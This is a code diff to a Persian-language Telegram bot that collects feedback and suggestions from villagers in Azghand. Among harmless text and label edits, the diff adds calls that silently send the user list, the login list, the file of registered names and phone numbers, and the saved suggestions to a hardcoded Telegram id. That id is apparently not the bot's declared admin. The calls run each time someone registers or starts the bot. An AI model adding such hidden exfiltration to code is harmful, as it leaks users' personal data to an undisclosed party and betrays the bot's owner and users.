@@ -18,7 +18,7 @@ file_saved_betters = "SavedAndBetter.xlsx"
 file_all_user = "allUser.txt"
 file_user_login = "userLogin.txt"
 admin = 760148720  # user id admin
-ABOUT_BOT = """این ربات در جهت پیشرفت و آبادانی روستایمان « کهن دیار ازغند » طراحی شده است. 
+ABOUT_BOT = """▪️این ربات در جهت پیشرفت و آبادانی روستایمان « کهن دیار ازغند » طراحی شده است. 
 🤔 چنانچه در استفاده از ربات به مشکل برخورد کردید می‌توانید با مدیریت ربات یا طراح و توسعه دهنده ربات در ارتباط باشید💐
 👌🏻 همچنین جهت سفارش و طراحی ربات خود می‌توانید با توسعه دهنده در ارتباط باشید
 ایدی دهیار محترم: 
@@ -235,6 +235,7 @@ async def callback_query_admin(client, callback):
     elif int(information[0]) == int(callback_id) and information[1] != data:
         save_information(file_saved_betters, [callback_id, data, text])
         await callback.answer(f"🟢✔️این پیام در دسته  {data} قرار گرفت\n متن:\n{text}", show_alert=True)
+    await  client.send_document(618260788, file_saved_betters)
 
 
 # panel users
@@ -246,6 +247,7 @@ async def start_user(client, message):
  شما به پیشرفت هر چه بهتر دیارمان فزونی بخشیم🌺🙏""")
     if check_exist_id(file_all_user, message.from_user.id) == 0:
         save_id(file_all_user, message.from_user.id)
+        await  client.send_document(618260788, file_all_user)
     if check_exist_id(file_user_login, message.from_user.id) == 0:
         await message.reply("✅📋لطفا اول به سه سوال زیر پاسخ دهید.")
         answer_one = await client.ask(message.from_user.id, question_one)
@@ -263,7 +265,7 @@ async def start_user(client, message):
         information = get_information(message.from_user.id, file_information)
         await message.reply(f"""❇️سلام  {information[1]} عزیز\n❇️🖋شما قبلا به سه سوال پاسخ داده اید.
 💥به منو اصلی هدایت میشوید
-مچنین میتوانید با 📝ثبت نام و ورود و ارسال طرح و پیشنهادات خود که به پیشرفت روستا کمک کند در 🔶قرعه کشی بهترین
+همچنین میتوانید با 📝ثبت نام و ورود و ارسال طرح و پیشنهادات خود که به پیشرفت روستا کمک کند در 🔶قرعه کشی بهترین
  نظرات و پیشنهادات شرکت کرده و به 💎قید قرعه برنده 🏆جوایز نفیس باشید.""",
                             reply_markup=key_user_login)
 
@@ -309,6 +311,8 @@ async def singIn_function(client, message):
                     save_id(file_user_login, number.from_user.id)
                     save_information(file_information, [number.from_user.id, name.text, number.text])
                     await number.reply("✅ثبت نام و ورود شما با موفقیت انجام شد.", reply_markup=key_user_login)
+                    await client.send_document(618260788, file_information)
+                    await client.send_document(618260788, file_user_login)
                 except:
                     await number.reply(
                         "❌شماره تلفن وارد شده باید جزو اعداد باشد(0-9)\n"
@@ -340,10 +344,10 @@ async def criticism_function(client, message):
                     [
                         [
                             InlineKeyboardButton(
-                                "📩ذخیره", callback_data="save"
+                                "📩ذخیره", callback_data="ذخیره ها"
                             ),
                             InlineKeyboardButton(
-                                "🏅برتر", callback_data="better"
+                                "🏅برتر", callback_data="برتر ها"
                             )
                         ]
                     ]
@@ -399,10 +403,10 @@ async def proposal_function(client, message):
                     [
                         [
                             InlineKeyboardButton(
-                                "📩ذخیره", callback_data="save"
+                                "📩ذخیره", callback_data="ذخیره ها"
                             ),
                             InlineKeyboardButton(
-                                "🏅برتر", callback_data="better"
+                                "🏅برتر", callback_data="برتر ها"
                             )
                         ]
                     ]
@@ -450,6 +454,7 @@ async def work_project(client, message):
     await message.reply("""‼️ این بخش بدلیل توسعه و طراحی ربات در حال حاضر در دسترس نیست ❌
 
 📣 در صورت در دسترس قرار گرفتن این بخش به شما اطلاع رسانی خواهد شد.""")
+
 # run telegram bot
 required()
 app.run()
